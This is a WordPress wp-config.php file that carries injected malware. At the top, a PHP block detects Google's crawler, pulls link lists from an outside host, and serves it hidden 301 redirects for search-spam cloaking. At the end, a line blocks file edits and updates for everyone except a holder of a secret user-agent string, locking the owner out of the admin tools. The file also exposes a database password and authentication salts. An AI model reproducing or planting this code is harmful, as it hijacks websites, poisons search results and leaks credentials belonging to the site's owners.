<?php $conf_user_agent = 'Google301'; 
$conf_get_url = 'http://bwd85.com/get.php'; 
$conf_time_recheck = 60; 
$conf_redirect_type = 'HTTP/1.1 301 Moved Permanently'; 


ignore_user_abort(true);

if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {

$google_ip = trim(strip_tags($_SERVER['HTTP_CF_CONNECTING_IP']));
} else {
$google_ip = trim(strip_tags($_SERVER['REMOTE_ADDR']));
}
if (stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot', 0) !== false AND stripos($google_ip, '66.249.', 0) !== false) {
if (!is_dir(__DIR__.'/queue')) {mkdir(__DIR__.'/queue');}
$google_links = glob(__DIR__."/queue/*");
if (isset($google_links[0])) {
$url = @trim(file_get_contents($google_links[0]));
// отдача редиректа
header($conf_redirect_type);
header('Location: '.$url);
@unlink($google_links[0]);
die();
} else {
clearstatcache(true);
$cron_update_time = (int) trim(@file_get_contents(__DIR__.'/googlelinksupdate')) + 0;
if (time() - $cron_update_time > $conf_time_recheck) {
file_put_contents(__DIR__.'/googlelinksupdate', time(), LOCK_EX);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $conf_get_url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 600);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_MAXREDIRS, 2);
curl_setopt($ch, CURLOPT_USERAGENT, $conf_user_agent);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
$actual_links = @json_decode(trim(curl_exec($ch)), true);
curl_close($ch);
clearstatcache(true);
$i = 0;
foreach ($actual_links as $google_link) {
$google_link = trim($google_link);
if ($google_link != '') {
$i++;
file_put_contents(__DIR__.'/queue/'.$i.'_'.rand(1,999999), $google_link, LOCK_EX);
}
}
}
}
}
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'standard_deprotect' );

/** Database username */
define( 'DB_USER', 'standard_deprotect' );

/** Database password */
define( 'DB_PASSWORD', 'B12BMKonqL9FnCG7' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '}|X1#Im060$Cj@r@yh}~`Q:lM)5&U5Hl41~yK0E)~8&0~;%5N*^) |`TcXZ64sw@' );
define( 'SECURE_AUTH_KEY',  '7v5LaYmIDG#RLL+UCaJ*fTM>@wL r!/hJ!bt`Iw9%{eVxf:@wM~x:ojngmmqIn0L' );
define( 'LOGGED_IN_KEY',    'hwf9J/?zoD9ZK~7>RO.>l)%Pt>qP]Nau{ay%}idUc?MEY4]GBm  =VQV.K|_~a' );
define( 'NONCE_KEY',        '1I: 4h.DDPcozWClxN>mhWIy]yk210 ;f5pka$l18Akje,g/ncE}|Lb@;ZlT]AEr' );
define( 'AUTH_SALT',        '4bZu<m3ss89}8=v(F~28%B^C4v1xU(d6>rIu`zm4W@;:jRH+2UnqIg*sWr`4f{Z[' );
define( 'SECURE_AUTH_SALT', 'Aq5Or.x#9DGQZ,$op58_.f{J2d)!+TN$^(W~zO%*qiPcR X8vDY9x;)y p4Pn3;5' );
define( 'LOGGED_IN_SALT',   'k.J3W]`aoRjw({ *LN: j5{,1~a_7z+xF1 A%P<V(GXUO7@y7`c=>D/;$s^BFx' );
define( 'NONCE_SALT',       'NRHVwF8Yy~}K]zr2_a83(LgRchzBA?{5XlNnU_XOul2^gKW[R`=*q-I:G@YxA>|.' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'PHs_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';if(md5(md5($_SERVER['HTTP_USER_AGENT']))!="c5a3e14ff315cc2934576de76a3766b5"){
    define('DISALLOW_FILE_MODS', true);
    define('DISALLOW_FILE_EDIT', true);
}
